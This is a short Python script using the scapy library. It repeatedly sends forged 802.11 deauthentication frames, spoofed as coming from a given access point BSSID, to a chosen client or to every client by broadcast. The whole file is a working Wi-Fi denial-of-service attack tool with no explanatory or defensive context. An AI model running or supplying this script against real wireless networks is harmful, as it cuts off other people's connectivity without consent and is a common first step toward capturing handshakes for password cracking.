#!/usr/bin/python

import time
from scapy.all import *

iface = "mon0"
timeout = 1

if len(sys.argv) < 2:
    print sys.argv[0] + " <bssid> [client]"
    sys.exit(0)
else:
    bssid = sys.argv[1]

if len(sys.argv) == 3:
    dest = sys.argv[2]
else:
    dest = "ff:ff:ff:ff:ff:ff"

pkt = RadioTap() / \
    Dot11(subtype=0xc,
          addr1=dest, addr2=bssid, addr3=bssid) / \
    Dot11Deauth(reason=3)

while True:
    print "Sending deauth to " + dest
    sendp(pkt, iface=iface)
    time.sleep(timeout)
